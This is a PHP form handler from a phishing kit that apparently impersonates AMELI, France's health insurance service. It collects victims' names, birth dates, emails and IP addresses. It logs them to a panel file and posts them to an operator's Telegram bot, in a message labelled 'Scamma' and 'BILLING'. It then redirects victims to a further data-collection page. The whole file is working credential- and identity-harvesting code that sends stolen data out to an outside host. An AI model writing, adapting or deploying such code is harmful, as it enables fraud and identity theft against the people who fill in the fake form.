<?php

include("../common/includes.php");
include("../config.php");

ob_start();
if (!isset($_SESSION)) {
    session_start();
}

function sanitize($data) {
    return htmlspecialchars(trim($data), ENT_QUOTES, "UTF-8");
}

function ifdash($v) {
    $v = is_string($v) ? trim($v) : $v;
    return ($v === '' || $v === null) ? '-' : $v;
}

$nom = isset($_POST['nom']) ? sanitize($_POST['nom']) : '';
$prenom = isset($_POST['prenom']) ? sanitize($_POST['prenom']) : '';
$day = isset($_POST['day']) ? sanitize($_POST['day']) : '';
$month = isset($_POST['month']) ? sanitize($_POST['month']) : '';
$year = isset($_POST['year']) ? sanitize($_POST['year']) : '';
$ddn = $day . "/" . $month . "/" . $year;
$Mail = isset($_POST['mail']) ? sanitize($_POST['mail']) : '';

if ($_SERVER['REQUEST_METHOD'] == 'POST') {

    $_SESSION['Nom']  = $nom;
    $_SESSION['Prenom']  = $prenom;
    $_SESSION['Ddn']  = $ddn;
    $_SESSION['mail']  = $Mail;

    $lastname   = ifdash($nom);
    $firstname  = ifdash($prenom);
    $birthdate  = ifdash($ddn);
    $email      = ifdash($Mail);
    $ip         = ifdash($_SERVER['REMOTE_ADDR']);
    $userAgent  = ifdash(isset($_SESSION['os']) ? $_SESSION['os'] : (isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : ''));
    $date = date('d/m/Y');
    $heure = date('H\hi');

    $infoString = $firstname . " | " . $lastname . " | " . $birthdate . " | " . $email . " | " . $ip . " | " . $date . " | " . $heure . PHP_EOL;

    $infoFilePath = dirname(__FILE__, 2) . '/panel/data/info.txt';
    $infoDir = dirname($infoFilePath);
    if (!is_dir($infoDir)) {
        mkdir($infoDir, 0777, true);
    }
    file_put_contents($infoFilePath, $infoString, FILE_APPEND | LOCK_EX);

    $message  = "<b>🏦 [ +1 BILLING // AMELI ]</b>\n\n";
    $message .= "<b>👮‍♂️ Prénom :</b> <code>{$firstname}</code>\n";
    $message .= "<b>👩‍🚒 Nom :</b> <code>{$lastname}</code>\n";
    $message .= "<b>🎂 Naissance :</b> <code>{$birthdate}</code>\n";
    $message .= "<b>📧 Email :</b> <code>{$email}</code>\n\n";
    $message .= "<b>🌐 IP :</b> <code>{$ip}</code>\n";
    $message .= "<b>🌍 Pays :</b> <code>France</code>\n";
    $message .= "<blockquote><b>🕒 Rez le [ <code>{$date}</code> à <code>{$heure}</code> ]</b>\n";
    $message .= "<b>🧑‍💻 Scamma - [ <code>AMELI</code> ]</b></blockquote>";

    $postFieldsSend = [
        'chat_id' => $rez_billing,
        'text' => $message,
        'parse_mode' => 'HTML',
    ];
    $sendUrl = "https://api.telegram.org/bot{$bot_token}/sendMessage";

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $sendUrl);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $postFieldsSend);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 4);
    curl_setopt($ch, CURLOPT_TIMEOUT, 8);
    curl_exec($ch);
    curl_close($ch);

    header('location: ../pages/adresse.php');
    exit;
}